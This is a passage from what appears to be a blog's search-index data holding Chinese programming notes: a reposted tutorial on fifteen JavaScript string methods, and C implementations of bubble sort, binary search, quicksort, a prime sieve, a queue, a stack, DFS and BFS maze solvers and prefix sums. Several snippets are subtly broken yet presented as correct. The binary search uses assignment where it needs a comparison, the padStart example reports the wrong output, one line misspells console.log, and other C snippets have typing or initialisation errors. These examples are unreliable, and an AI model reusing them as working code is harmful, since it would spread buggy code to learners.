&#39;&#x2F;pages&#x2F;index&#x2F;index&#39;,\n&#125;);\n\n","slug":"微信小程序开发笔记","date":"2021-01-16T15:17:00.000Z","categories_index":"学习笔记","tags_index":"微信小程序","author_index":"kif"},{"id":"a6e4e55029c5e4aec2417aca65ffdd26","title":"Javascript字符串处理","content":"\n\n\n\n\n\n\n\n\n作为JavaScript基础数据类型，字符串具有一些很强大的方法，在平时的工作中用到的地方也特别的多，很多时候因为不熟悉某个字符串的方法，往往走了很多弯路，所以整理了15个常用又高效的字符串方法，来一起看看这15个提升工作效率的方法吧！\n1. 字符串去除首尾空格 —— trim()说明： 去除字符串两边的空白。\n需求场景： 用户搜索前去除输入的首尾空格。\n用法： string.trim()\n例子：\nlet str &#x3D; &quot;    白色不白，黑色不黑，我...我不喜欢你   &quot;\nlet result &#x3D; str.trim()\nconsole.log(result); &#x2F;&#x2F; 控制台打印：&quot;白色不白，黑色不黑，我...我不喜欢你&quot;\n复制代码\n\n2. 字符串替换指定字符（串）—— replace()说明： 字符串替换字符还是replace()最强大~默认替换第一个符合条件的字符串，也可用正则做全局匹配\n需求场景： 字符串的替换，关键词的屏蔽隐藏等\n用法： string.replace(searchvalue,newvalue)\n例子：\nlet str &#x3D; &quot;你知道吗？世界上有60亿人，宇宙有60万亿小行星，你比小行星还要珍贵一万倍&quot;\nlet result1 &#x3D; str.replace(&quot;亿&quot;,&quot;个&quot;)\nlet result2 &#x3D; str.replace(&#x2F;亿&#x2F;g,&quot;个&quot;)\nconsole.log(result1)  &#x2F;&#x2F; 控制台打印：&quot;你知道吗？世界上有60个人，宇宙有60万亿小行星，你比小行星还要珍贵一万倍&quot;\nconsole.log(result2)  &#x2F;&#x2F; 控制台打印：&quot;你知道吗？世界上有60个人，宇宙有60万个小行星，你比小行星还要珍贵一万倍&quot;\n复制代码\n\n3. 字符串合并 —— concat()说明： 连接两个或更多字符串，并返回新的字符串。（悄悄告诉你，数组也可以使用哦~）\n需求场景： 字符串合并展示。\n用法： string.concat()\n例子：\nlet str1 &#x3D; &quot;我有很多好听的情话,&quot;\nlet str2 &#x3D; &quot;可面对你都不敢说不出口。&quot;\nlet result &#x3D; str1.concat(str2)\nconsole.log(result) &#x2F;&#x2F; 控制台打印：&quot;我有很多好听的情话,可面对你都不敢说不出口。&quot;\n复制代码\n\n4. 字符串转数组 —— split()说明： 把字符串通过特定字符分割为字符串数组，split还可以使用正则表达式实现拆分多个分隔符。\n需求场景： 字符串转数组进行遍历等操作。\n用法1： string.split()\n用法2： string.split(/[*]/)\n例子：\nlet str &#x3D; &quot;张三,李四;王五&quot;\nlet result1 &#x3D; str.split(&#39;,&#39;)\nlet result2 &#x3D; str.split(&#x2F;[,;]&#x2F;)\nconsole.log(result1) &#x2F;&#x2F; 控制台打印：[&quot;张三&quot;, &quot;李四;王五&quot;]\nconsole.log(result2) &#x2F;&#x2F; 控制台打印：[&quot;张三&quot;, &quot;李四&quot;, &quot;王五&quot;]\n复制代码\n\n5. 字符串转数组 —— […string]说明： 说起来，这并不是字符串的方法，主要是我觉得ES6语法中的扩展操作符的…语法是转数组最简洁的方法。它和split()区别在于：...语法不根据特定字符切割，而是把每个字符都当作单独的元素添加到数组中。\n需求场景： 字符串全部分割成字符数组。\n用法： [...string]\n例子：\nlet str &#x3D; &#39;这是一个字符串string&#39;\nlet arr &#x3D; [...str]\nconsole.log(arr) &#x2F;&#x2F; 控制台打印：[&quot;这&quot;, &quot;是&quot;, &quot;一&quot;, &quot;个&quot;, &quot;字&quot;, &quot;符&quot;, &quot;串&quot;, &quot;s&quot;, &quot;t&quot;, &quot;r&quot;, &quot;i&quot;, &quot;n&quot;, &quot;g&quot;]\n复制代码\n\n6. 字符串反转 —— […string].reverse().join(“”)说明： 这个也不能算是字符串方法，但是好用。本质上还是转成数组，数组反转之后，再拼接成字符串。\n需求场景： 将当前字符串反转输出\n用法： [...string].reverse().join(&quot;&quot;)\n例子：\nlet str &#x3D; &quot;两极反转，龙卷风摧毁停车场!&quot;\nlet result &#x3D; [...str].reverse().join(&quot;&quot;)\nconsole.log(result) &#x2F;&#x2F; 控制台打印：!场车停毁摧风卷龙，转反极两\n复制代码\n\n7. 字符串的多次复制 —— repeat ()说明： 复制字符串指定次数，并将它们连接在一起返回。\n需求场景： 字符串需要进行 n 次自动复制。\n用法： string.repeat(n)\n例子：\nlet str1 &#x3D; &#39;复制&#39;\nlet result &#x3D; str1.repeat(2)\nconsol.log(result) &#x2F;&#x2F; 控制台打印：复制复制\n\nlet str2 &#x3D; &#39;10&#39;\nlet result &#x3D; str2.repeat(5)\nconsole.log(result) &#x2F;&#x2F; 控制台打印：1010101010\n复制代码\n\n8. 字符串是否包含某字符 （串）—— search()说明：检索字符串中指定的或与正则表达式相匹配的首个子字符串。如果匹配到了则返回匹配字符串首字符下标，如果没有匹配到，则返回 -1。\n需求场景： 字符串内关键字的搜索查询定位。\n用法： string.search(searchvalue)。\n例子：\nlet str &#x3D; &quot;今天的夜色很好，月亮也很圆，唯一遗憾的是，我不是从你的窗子里看到的月亮。&quot;\nlet result1 &#x3D; str.search(&quot;月亮&quot;)\nlet result2 &#x3D; str.search(&#x2F;[，。]&#x2F;)\nconsole.log(result1) &#x2F;&#x2F; 控制台打印：8\nconsole.log(result2) &#x2F;&#x2F; 控制台打印：7\n复制代码\n\n9. 字符串内是否包含某字符（串）—— includes()说明： includes()可选择从某处下标之后开始查找，返回true或false。第二个参数代表从某下标处开始查找，忽略则代表从下标0开始查找。\n它和search()区别在于：search()返回指定下标， includes()返回true或false；search()不能从指定下标开始查找， includes()可以从指定下标处开始查找。\n需求场景： 判断字符串中是否有不合法字符等\n用法： string.includes(searchvalue, start)\n例子：\nlet str &#x3D; &quot;没有夏日的的凉风，也没有冬日的暖阳，它们只是恰好出现在了合适的时间罢了&quot;\nlet result1 &#x3D; str.includes(&quot;冬日&quot;)\nlet result2 &#x3D; str.includes(&quot;冬日&quot;,20)\nconsole.log(result1); &#x2F;&#x2F; 控制台打印：true\nconsole.log(result2); &#x2F;&#x2F; 控制台打印：false\n复制代码\n\n10. 字符串中指定的字符串值在首次或最后一次出现的位置 —— indexOf() 和 lastIndexOf()说明：\nindexOf() 方法可返回某个指定的字符串值首次出现的位置，即从前向后搜索。如果指定第二个参数 start，则在字符串中的指定位置开始从前向后搜索。\nlastIndexOf() 方法可返回某个指定的字符串值最后出现的位置，即从后向前搜索。如果指定第二个参数 start，则在字符串中的指定位置从后向前搜索。\n需求场景： 关键字首次或最后一次出现的位置\n用法1： string.indexOf(searchvalue,start) 指定的字符串值首次出现的位置\n用法2： string.lastIndexOf(searchvalue,start) 指定的字符串值最后出现的位置\n例子：\nlet str &#x3D; &quot;你来人间一趟，你要看看太阳。和你的心上人一起走在街上，了解她，也要了解太阳&quot;\nlet result1 &#x3D; str.indexOf(&quot;太阳&quot;)\nlet result2 &#x3D; str.indexOf(&quot;太阳&quot;,10)  &#x2F;&#x2F; 从10下标的字符开始查找&quot;太阳&quot;，查找范围是&quot;太阳。和你的心上人一起走在街上，了解她，也要了解太阳&quot;，下标还是相对原字符串而言的，因此返回11。\nlet result3 &#x3D; str.lastIndexOf(&quot;太阳&quot;) \nlet result4 &#x3D; str.lastIndexOf(&quot;太阳&quot;,10)  &#x2F;&#x2F; 0-10下标的字符串为&quot;你来人间一趟，你要看看&quot;，没有&quot;太阳&quot;，返回-1\nconsole.log(result1) &#x2F;&#x2F; 控制台打印：11\nconsole.log(result2) &#x2F;&#x2F; 控制台打印：11\nconsole.log(result3) &#x2F;&#x2F; 控制台打印：35\nconsole.log(result4) &#x2F;&#x2F; 控制台打印：-1\n复制代码\n\n11. 字符串转大小写 —— toLowerCase() 和 toUpperCase()说明： 字符串大小写之间的转换\n需求场景： 网址，英文名，首字母大写等要求。\n用法1： string.toLowerCase() 转成小写字母\n用法2： string.toUpperCase() 转成大写字母\n例子：\nlet str &#x3D; &quot;For you, A thousand times over&quot;\nlet result1 &#x3D; str.toLowerCase()\nlet result2 &#x3D; str.toUpperCase()\nconsole.log(result1) &#x2F;&#x2F; 控制台打印：&quot;for you, a thousand times over&quot;\nconsole.log(result2) &#x2F;&#x2F; 控制台打印：&quot;FOR YOU, A THOUSAND TIMES OVER&quot;\n复制代码\n\n12. 字符串填充到指定长度 —— padStart () 和 padEnd ()说明： 字符串填充指定字符到指定长度\n需求场景： 字符串长度不足，需要补充至指定长度n，如年月日，隐藏手机号，隐藏昵称等。\n用法1： string.padStart(n,&#39;补充内容&#39;) 从字符串前添加补充内容。\n用法2： string.padEnd (n,&#39;补充内容&#39;) 从字符串后添加补充内容。\n例子：\n&#x2F;&#x2F; 在字符串前补充&quot;-&quot;，直到字符串的长度为5\nlet str1 &#x3D; &#39;预备开始&#39;\nlet result &#x3D; str1.padStart(5, &#39;-&#39;)\nconsole.log(result) &#x2F;&#x2F; 控制台打印：&quot;---预备开始&quot;\n\n&#x2F;&#x2F;在末尾添加&quot;*&quot;，直到字符串的长度为11\nlet str2 &#x3D; &quot;184&quot;\nlet result &#x3D; str2.padEnd(11, &quot;*&quot;)\nconsole.log(result) &#x2F;&#x2F; 控制台打印：&quot;184********&quot;\n复制代码\n\n13. 字符串是否以特定字符（串）开头或结尾 —— startsWith()、endsWith()说明： 用于检测字符串是否以指定的子字符串开始。如果是以指定的子字符串开头返回 true，否则 false。startsWith()、endsWith()方法区分大小写。第二个参数代表从某下标处开始判断是否以特定字符（串）开头或结尾，忽略则startsWith()从下标0开始检测，endsWith()从字符串最后一位下标开始检测。\n值得注意的是：\n当startsWith() 的第二个参数如果超出了当前字符串的最大长度，依旧生效，返回false。\n当endsWith() 的第二个参数如果超出了当前字符串的最大长度，会不生效，改为从字符串最后一位下标开始检测。\n需求场景： 判断字符串是否以指定字符开头或结尾\n用法1： string.startsWith(searchvalue, start)\n用法2： string.endsWith(searchvalue, start)\n例子：\nlet str &#x3D; &quot;过去的时候，我们相视一笑，就已过了大半辈子&quot;\nlet result1 &#x3D; str.startsWith(&quot;过去&quot;)\nlet result2 &#x3D; str.startsWith(&quot;过去&quot;,10)\nlet result3 &#x3D; str.endsWith(&quot;半辈子&quot;)\nlet result4 &#x3D; str.endsWith(&quot;半辈子&quot;,20)\nconsole.log(result1); &#x2F;&#x2F; 控制台打印：true\nconsole.log(result2); &#x2F;&#x2F; 控制台打印：false\nconsole.log(result3); &#x2F;&#x2F; 控制台打印：true\nconsole.log(result4); &#x2F;&#x2F; 控制台打印：false\n复制代码\n\n14. 字符串长度计算 —— length说明： length属性不仅是数组的属性，同时伪数组，字符串都有length属性。但是遇到某些生僻字如“𩸽”或者表情符号“🙂”，它们的length为2，这时候返回的length可能不是我们真正想要的。这是因为js字符串是由16位的代码单元组成，而不是由Unicode代码点组成。同时js使用两个代码单元表示216及其以上的Unicode代码点。这两个代码单元被称为代理对。一个代码单元被默认为1个长度单位，像“𩸽”或者“🙂”是由两个代码单元组成的代理对，因此它们的length为2。\n需求场景： 求出当前字符串长度\n用法： string.length\n例子：\nlet str &#x3D; &quot;相约白头偕老，你却悄悄秃了头&quot;\nlet result &#x3D; str.length\nconsole.log(result) &#x2F;&#x2F; 控制台打印：14\n复制代码\n\n15. 字符串截取 —— substr() 和 slice() 和 substring()说明： 字符串截取和拼接是字符串最常用也是最易错的方法。主要原因是 substr() 、 slice() 和 substring()的区别有很多小伙伴还不太明白。\nsubstr()：\n\n\n\n\n\n\n\n\n\n参数一（必须）：一个整数，要开始截取字符的下标，如为负则代表从尾部开始截取。参数二（可选）：一个整数，要截取字符的数量。如果省略该参数，则默认为string.length，即当前字符串的长度。\nslice() ：\n\n\n\n\n\n\n\n\n\n参数一（必须）：一个整数，要开始截取字符的下标，如为负则代表从尾部开始截取。参数二（可选）：一个整数，要结束截取字符的下标，如为负则代表从尾部截取多少个字符。如果省略该参数，则默认为string.length，即当前字符串的长度。\nsubstring() ：\n\n\n\n\n\n\n\n\n\n参数一（必须）：一个非负的整数，要开始截取字符的下标。参数二（可选）：一个非负的整数，要结束截取字符的下标。如果省略该参数，则默认为string.length，即当前字符串的长度。\n需求场景： 截取指定下标指定长度的字符串\n用法1： string.substr(start,length)\n用法2： string.slice(start,end)\n用法3： string.substring(start,end)\n例子：\nlet str &#x3D; &#39;0123456789&#39;\nlet result1 &#x3D; str.substr(2,5) &#x2F;&#x2F; 从下标2开始截取，截取5位\nlet result2 &#x3D; str.slice(2,5)  &#x2F;&#x2F; 从下标2开始截取，截取到下标5（不含下标5）\nlet result3 &#x3D; str.substring(2,5) &#x2F;&#x2F; 从下标2开始截取，截取到下标5（不含下标5）\n\nconsole.log(result1) &#x2F;&#x2F; 控制台打印：23456\nconsole.log(result2) &#x2F;&#x2F; 控制台打印：234\nconsole.log(result3) &#x2F;&#x2F; 控制台打印：234\n复制代码\n\n总结这就是关于字符串常用的15个方法详细说明，可在我们工作中的很多时候，可能并不能很好的使用它们。大多是因为不够熟练，看一遍容易忘记，所以我们要时常翻一翻这些常用的方法，也许就能节省你工作中几十分钟~ 为摸鱼大业添砖加瓦 ~\n转自：《看完就懂系列》15个方法教你玩转字符串\n","slug":"Javascript字符串处理","date":"2021-01-10T10:38:00.000Z","categories_index":"学习笔记,转载","tags_index":"javascript,前端","author_index":"kif"},{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"输入未知长度字符数组#include &lt;stdio.h&gt;\nint main()\n&#123;\n\tchar array_num[100] ;\n\tint i &#x3D; 0, length;\n\tdo\n\t&#123;\n\t\tscanf(&quot;%c&quot;, &amp;array_num[i]);\n\t\ti++;\n\t&#125; while (array_num[i - 1] !&#x3D; &#39;\\n&#39;);\n\tlength &#x3D; i-1;\n\n\tfor (i &#x3D; 0; i &lt; length; i++)\n\t\tprintf(&quot;%c&quot;, array_num[i]);\n\n\tgetchar();&#x2F;&#x2F;VS2017中特殊设置，解决CMD窗口闪退问题\n\t\n\treturn 0;\n&#125;\n\n\n冒泡排序#include &lt;stdio.h&gt;\nvoid fun1(int num[], int length);\n\nint main() &#123;\n\tint a[1001];\n\tint k, i, j;\n\tscanf(&quot;%d&quot;, &amp;k);\n\tfor (i &#x3D; 0; i &lt; k; i++) &#123;\n\t\tscanf(&quot;%d&quot;, &amp;a[i]);\n\t&#125;\n\tfun1(a, k);\n\t\n\tfor (i &#x3D; 0; i &lt; k; i++) &#123;\n\t\tprintf(&quot;%d &quot;, a[i]);\n\t&#125;\n&#125;\n\nvoid fun1(int num[], int length) &#123;\n\tint i, j;\n\tfor (i &#x3D; 0; i &lt; length - 1; ++i) &#123;\n\t\tfor (j &#x3D; 0; j &lt; length - i - 1; ++j) &#123;\n\t\t\tif (num[j] &gt; num[j + 1]) &#123;\n\t\t\t\tint t;\n\t\t\t\tt &#x3D; num[j];\n\t\t\t\tnum[j] &#x3D; num[j + 1];\n\t\t\t\tnum[j + 1] &#x3D; t;\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n\n&#125;\n\n\n\n\n\n折半查找#include &lt;stdio.h&gt;\nvoid fun1(int num[], int length);\nint fun2(int num[], int length, int x);\n\nint main() &#123;\n\tint a[1001];\n\tint k, i, j;\n\tscanf(&quot;%d&quot;, &amp;k);\n\tfor (i &#x3D; 0; i &lt; k; i++) &#123;\n\t\tscanf(&quot;%d&quot;, &amp;a[i]);\n\t&#125;\n\tfun1(a, k);\n\n\tfor (i &#x3D; 0; i &lt; k; i++) &#123;\n\t\tif (i &#x3D;&#x3D; 0) &#123;\n\t\t\tprintf(&quot;%d&quot;, a[i]);\n\t\t&#125; else &#123;\n\t\t\tprintf(&quot; %d&quot;, a[i]);\n\t\t&#125;\n\n\t&#125;\n\tprintf(&quot;\\n&quot;);\n\tint flag &#x3D; fun2(a, k, 4);\n\tprintf(&quot;%d\\n&quot;, flag);\n&#125;\n\nvoid fun1(int num[], int length) &#123;\n\tint i, j;\n\tfor (i &#x3D; 0; i &lt; length - 1; ++i) &#123;\n\t\tfor (j &#x3D; 0; j &lt; length - i - 1; ++j) &#123;\n\t\t\tif (num[j] &gt; num[j + 1]) &#123;\n\t\t\t\tint t;\n\t\t\t\tt &#x3D; num[j];\n\t\t\t\tnum[j] &#x3D; num[j + 1];\n\t\t\t\tnum[j + 1] &#x3D; t;\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n\n&#125;\n\nint fun2(int num[], int length, int x) &#123;\n\tint low &#x3D; 0;\n\tint high &#x3D; length - 1;\n\twhile (low &lt; high) &#123;\n\t\tint mid &#x3D; (high + low) &#x2F; 2;\n\t\tif (x &#x3D; num[mid]) &#123;\n\t\t\treturn mid;\n\t\t&#125; else if (num[mid] &gt; x) &#123;\n\t\t\thigh &#x3D; mid - 1;\n\t\t&#125; else &#123;\n\t\t\tlow &#x3D; mid+1;;\n\t\t&#125;\n\t&#125;\n\treturn 0;\n\n\n\n&#125;\n\n桶排序#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\nint main()\n&#123;\n\tchar str[100];\n\tint book[100] &#x3D; &#123; 0 &#125;;\n\twhile (scanf(&quot;%s&quot;, str) !&#x3D; EOF)\n\t&#123;\n\t\tint len &#x3D; strlen(str);\n\t\tfor (int i &#x3D; 0; i &lt; len; i++)\n\t\t&#123;\n\t\t\tbook[str[i]]++;\n\t\t&#125;\n\t\tfor (int i &#x3D; 0; i &lt; 95; i++)\n\t\t&#123;\n\t\t\tif (book[i] !&#x3D; 0)\n\t\t\t&#123;\n\t\t\t\tprintf(&quot;%c&quot;, i);\n\t\t\t&#125;\n\t\t&#125;\n\t\tprintf(&quot;\\n&quot;);\n\t&#125;\n\t\n\treturn 0;\n&#125;\n\n快速排序#include&lt;stdio.h&gt;\nint num[100];\nint n;\n\nvoid quicksort(int left, int right)\n&#123;\n\tint i, j,t, temp;\n\tif (left &gt; right)\n\t&#123;\n\t\treturn;\n\t&#125;\n\ttemp &#x3D; num[left];\n\ti &#x3D; left;\n\tj &#x3D; right;\n\twhile (i !&#x3D; j)\n\t&#123;\n\t\twhile (num[j] &gt;&#x3D; temp &amp;&amp; j &gt; i)\n\t\t&#123;\n\t\t\tj--;\n\t\t&#125;\n\t\twhile (num[i] &lt;&#x3D; temp &amp;&amp; i &lt; j)\n\t\t&#123;\n\t\t\ti++;\n\t\t&#125;\n\t\tif (i &lt; j)\n\t\t&#123;\n\t\t\tt &#x3D; num[i];\n\t\t\tnum[i] &#x3D; num[j];\n\t\t\tnum[j] &#x3D; t;\n\t\t&#125;\n\t&#125;\n\t\n\tnum[left] &#x3D; num[i];\n\tnum[i] &#x3D; temp;\n\tquicksort(left, i - 1);\n\tquicksort(i + 1, right);\n\n\treturn;\n&#125;\n\nint main()\n&#123;\n\t\n\tscanf(&quot;%d&quot;, &amp; n);\n\tint i;\n\tfor (i &#x3D; 0; i &lt; n; i++)\n\t&#123;\n\t\tscanf(&quot;%d&quot;, &amp;num[i]);\n\t&#125;\n\n\tquicksort(0, n-1);\n\tfor (i &#x3D; 0; i &lt; n; i++)\n\t&#123;\n\t\tif (i &#x3D;&#x3D; 0)\n\t\t&#123;\n\t\t\tprintf(&quot;%d&quot;, num[0]);\n\t\t&#125;\n\t\telse\n\t\t&#123;\n\t\t\tprintf(&quot; %d&quot;, num[i]);\n\t\t&#125;\n\t\t\n\n\t&#125;\n\tprintf(&quot;\\n&quot;);\n\t\n\treturn 0;\n&#125;\n\n\n\n埃氏筛法#include &lt;stdio.h&gt;\nint fun(int n);\n\nint main() &#123;\n\tint n;\n\tscanf(&quot;%d&quot;, &amp;n);\n\tint k;\n\tk &#x3D; fun(n);\n\tprintf(&quot;%d\\n&quot;, k);\n\treturn 0;\n&#125;\n\nint fun(int n) &#123;\n\tint count &#x3D; 0;\n\tint num[n + 1];\n\tint i;\n\tnum[0] &#x3D; 0;\n\tnum[1] &#x3D; 0;\n\tfor (i &#x3D; 2; i &lt; n; i++) &#123;\n\t\tnum[i] &#x3D; 1;\n\t&#125;\n\tint j;\n\tfor (j &#x3D; 2; j &lt;&#x3D; n; j++) &#123;\n\t\tif (num[j] &#x3D;&#x3D; 1) &#123;\n\t\t\tcount++;\n\t\t\tint x;\n\t\t\tfor (x &#x3D; 2 * j; x &lt;&#x3D; n; x &#x3D; x + j) &#123;\n\t\t\t\tnum[x] &#x3D; 0;\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n\treturn count;\n&#125;\n\n队列结构体\n解密：一串字符，第1个数删除，第2个数放到最后；第3个数删除，第4个数放到最后.。。。。\n例如：631758924加密后为615947283\n#include&lt;stdio.h>\nstruct queue\n&#123;\n\tint data[100];\n\tint head;\n\tint tail;\n&#125;;\nint main()\n&#123;\n\tint n;\n\tstruct queue q;\n\tscanf(\"%d\", &amp;n);\n\tint i;\n\tfor (i = 0; i &lt; n; i++)\n\t&#123;\n\t\tscanf(\"%d\", &amp;q.data[i]);\n\t&#125;\n\tq.head = 0;\n\tq.tail = n;\n\twhile (q.head &lt; q.tail)\n\t&#123;\n\t\tprintf(\"%d \", q.data[q.head]);\n\t\tq.data[q.tail] = q.data[q.head + 1];\n\t\tq.tail++;\n\t\tq.head += 2;\n\n\t&#125;\n\tprintf(\"\\n\");\n\n\treturn 0;\n&#125;\n\n栈判断回文串\n#include&lt;stdio.h>\n#include&lt;string.h>\nint main()\n&#123;\n\tint len;\n\tchar s[101];\n\tgets(s);\n\tlen = strlen(s);\n\tint mid = len / 2-1;\n\t/// &lt;summary>\n\t///  左边压栈\n\t/// &lt;/summary>\n\t/// &lt;returns>&lt;/returns>\n\tchar str[101];\n\tint top = 0;\n\tint i;\n\tfor (i = 0;i &lt;= mid; i++)\n\t&#123;\n\t\tstr[++top] = s[i];\n\t&#125;\n\t/// &lt;summary>\n\t/// 判断\n\t/// &lt;/summary>\n\t/// &lt;returns>&lt;/returns>\n\tint next=0;\n\tif (len % 2 == 0)\n\t&#123;\n\t\tnext = mid + 1;\n\t&#125;\n\telse\n\t&#123;\n\t\tnext = mid + 2;\n\t&#125;\n\tfor (i = next; i &lt; len; i++)\n\t&#123;\n\t\tif (s[i] != str[top])\n\t\t&#123;\n\t\t\tbreak;\n\t\t&#125;\n\t\ttop--;\n\t&#125;\n\n\tif (top == 0)\n\t&#123;\n\t\tprintf(\"Yes\\n\");\n\t&#125;\n\telse\n\t&#123;\n\t\tprintf(\"No\\n\");\n\t&#125;\n\n\treturn 0;\n&#125;\n\n\n\n深度优先1-10中选数字，使得a’b’c+def&#x3D;hij;不能重复选void dfs(int step)\n&#123; \n\t判断边界\n\t尝试每一中可能for(i&#x3D;0;i&lt;&#x3D;n;i++)\n\t&#123;\n\t\t继续下一步dfs(step+1)\n\t&#125;\n\t返回\n&#125;\n\n\n\n#include&lt;stdio.h>\nint a[10],book[10];\nint sum=0;\nvoid dfs(int step)\n&#123;\n    int i;\n    if(step==10)\n    &#123;\n\n\n        if(a[1]*100+a[2]*10+a[3]+a[4]*100+a[5]*10+a[6]==a[7]*100+a[8]*10+a[9])\n        &#123;\n            sum++;\n            printf(\"%d%d%d+%d%d%d=%d%d%d\\n\",a[1],a[2],a[3],a[4],a[5],a[6],a[7],a[8],a[9]);\n        &#125;\n        return;\n    &#125;\n\n    for(i=1;i&lt;=9;i++)\n    &#123;\n        if(book[i]==0)\n        &#123;\n            a[step]=i;\n            book[i]=1;\n            dfs(step+1);\n            book[i]=0;\n        &#125;\n    &#125;\n    return;\n&#125;\nint main()\n&#123;\n\n    dfs(1);\n\n    printf(\"Total ： %d\\n\",sum/2);\n\n    return 0;\n&#125;\n\n迷宫n行m列，0表示可走，1表示障碍，从（startx，starty）到（p，q)，找最短路径\n#include&lt;stdio.h>\nint min=999;\nint a[51][51];\nbook[51][51];\nint n,m;\nint p,q;\nint next[4][2]=&#123;\n        &#123;1,0&#125;,\n        &#123;0,1&#125;,\n        &#123;-1,0&#125;,\n        &#123;0,-1&#125;\n&#125;;\n\nvoid dfs(int x,int y,int step)\n&#123;\n    if(x==p&amp;&amp;y==q)\n    &#123;\n        if(step&lt;min)\n        &#123;\n            min=step;\n        &#125;\n        return;\n    &#125;\n    int i=0;\n    for(i=0;i&lt;4;i++)\n    &#123;\n        int tx = x+next[i][0];\n        int ty = y+next[i][1];\n        if(tx>=0&amp;&amp;tx&lt;n&amp;&amp;ty>=0&amp;&amp;ty&lt;m)\n        &#123;\n            if(book[tx][ty]==0&amp;&amp;a[tx][ty]==0)\n            &#123;\n                book[tx][ty]=1;\n                dfs(tx,ty,step+1);\n                book[tx][ty]=0;\n            &#125;\n        &#125;\n\n    &#125;\n    return;\n&#125;\n\nint main()\n&#123;\n\n    scanf(\"%d %d\",&amp;n,&amp;m);\n    int i,j;\n    for(i=0;i&lt;n;i++)\n    &#123;\n        for(j=0;j&lt;m;j++)\n        &#123;\n            scanf(\"%d\",&amp;a[i][j]);\n        &#125;\n    &#125;\n    int startx,starty;\n    scanf(\"%d %d %d %d\",&amp;startx,&amp;starty,&amp;p,&amp;q);\n    book[startx][starty]=1;\n    dfs(startx,starty,0);\n    printf(\"%d\\n\",min);\n\n\n\n    return 0;\n&#125;\n\n样例输入\n5 4\n0 0 1 0\n0 0 0 0\n0 0 1 0\n0 1 0 0\n0 0 0 1\n0 0 3 2\n\n\n样例输出\n7\n\n\n广度优先迷宫n行m列，0表示可走，1表示障碍，从（startx，starty）到（p，q)，找最短路径\n#include&lt;stdio.h>\nstruct note&#123;\n    int x;\n//    横坐标\n    int y;\n//    纵坐标\n    int s;\n//    步数\n&#125;;\n\nint main()\n&#123;\n    struct note que[2501];\n    int a[51][51];\n    int book[51][51]=&#123;0&#125;;\n    int next[4][2]=&#123;\n            &#123;0,1&#125;,\n            &#123;1,0&#125;,\n            &#123;0,-1&#125;,\n            &#123;-1,0&#125;\n    &#125;;\n    int head,tail;\n\n    int n,m;\n    int i,j;\n    int startx,starty,p,q;\n    scanf(\"%d %d\",&amp;n,&amp;m);\n    for(i=1;i&lt;=n;i++)\n    &#123;\n        for(j=1;j&lt;=m;j++)\n        &#123;\n            scanf(\"%d\",&amp;a[i][j]);\n        &#125;\n    &#125;\n    scanf(\"%d %d %d %d\",&amp;startx,&amp;starty,&amp;p,&amp;q);\n    head=1;\n    tail=1;\n    que[tail].x=startx;\n    que[tail].y=starty;\n    que[tail].s=0;\n    tail++;\n    book[startx][starty]=1;\n    int k,tx,ty;\n    int flag=0;\n    while(head&lt;tail)\n    &#123;\n        for(k=0;k&lt;4;k++)\n        &#123;\n            tx=que[head].x+next[k][0];\n            ty=que[head].y+next[k][1];\n            if(tx>0&amp;&amp;tx&lt;=n&amp;&amp;ty>0&amp;&amp;ty&lt;=m)\n            &#123;\n                if(a[tx][ty]==0&amp;&amp;book[tx][ty]==0)\n                &#123;\n                    book[tx][ty]=1;\n                    que[tail].x=tx;\n                    que[tail].y=ty;\n                    que[tail].s=que[head].s+1;\n                    tail++;\n                &#125;\n            &#125;\n            if(tx==p&amp;&amp;ty==q)\n            &#123;\n                flag=1;\n                break;\n            &#125;\n        &#125;\n        if(flag==1)\n        &#123;\n            break;\n        &#125;\n        head++;\n    &#125;\n    printf(\"%d\\n\",que[tail-1].s);\n    return 0;\n&#125;\n\n样例输入\n5 4\n0 0 1 0\n0 0 0 0\n0 0 1 0\n0 1 0 0\n0 0 0 1\n0 0 3 2\n\n样例输出\n7\n\n\n不要输出多余的零%g\n\n数据类型\n定义一个未知行数和列数的二维数组#include &lt;stdio.h&gt;\nint main()\n&#123;\n    int n;\n    scanf(&quot;%d&quot;,&amp;n);\n    int **num &#x3D; (int**)malloc(sizeof(int*)*n);\n    int i;\n    for(i&#x3D;0;i&lt;n;i++)&#123;\n        num[i]&#x3D;(int*)malloc(sizeof(int)*n);\n    &#125;\n    int j;\n    for(i&#x3D;0;i&lt;n;i++)&#123;\n        for(j&#x3D;0;j&lt;n;j++)&#123;\n            scanf(&quot;%d&quot;,&amp;num[i][j]);\n        &#125;\n    &#125;\n\n    return 0;\n&#125;\n\n\n前缀和前缀和是指某序列的前n项和，可以把它理解为数学上的数列的前n项和，而差分可以看成前缀和的逆运算。合理的使用前缀和与差分，可以将某些复杂的问题简单化。\n\n一维前缀和输入一个长度为n的整数序列。接下来再输入m个询问，每个询问输入一对l, r。对于每个询问，输出原序列中从第l个数到第r个数的和。\n我们很容易想出暴力解法，遍历区间求和。\n代码如下：\nint n,m;\nscanf(&quot;%d%d&quot;,&amp;n,&amp;m);\nfor(int i&#x3D;1;i&lt;&#x3D;n;i++) scanf(&quot;%d&quot;,&amp;a[i]);\nwhile(m--)\n&#123;\n    int l,r;\n    int sum&#x3D;0;\n    scanf(&quot;%d%d&quot;,&amp;l,&amp;r);\n    for(int i&#x3D;l;i&lt;&#x3D;r;i++)\n    &#123; \n        sum+&#x3D;a[i];\n    &#125;\n    printf(&quot;%d\\n&quot;,sum);\n&#125;\n\n\n这样的时间复杂度为O(n*m)，如果n和m的数据量稍微大一点就有可能超时，而我们如果使用前缀和的方法来做的话就能够将时间复杂度降到O(n+m),大大提高了运算效率。\n具体做法：\n首先做一个预处理，定义一个sum[]数组，sum[i]代表a数组中前i个数的和。\n求前缀和运算：\nconst int N&#x3D;1e5+10;\nint sum[N],a[N]; &#x2F;&#x2F;sum[i]&#x3D;a[1]+a[2]+a[3].....a[i];\nfor(int i&#x3D;1;i&lt;&#x3D;n;i++)\n&#123; \n    sum[i]&#x3D;sum[i-1]+a[i];   \n&#125;\n\n\n然后查询操作：\n scanf(&quot;%d%d&quot;,&amp;l,&amp;r);\n printf(&quot;%d\\n&quot;, sum[r]-sum[l-1]);\n对于每次查询，只需执行sum[r]-sum[l-1] ，时间复杂度为O(1)\n\n原理\nsum[r] 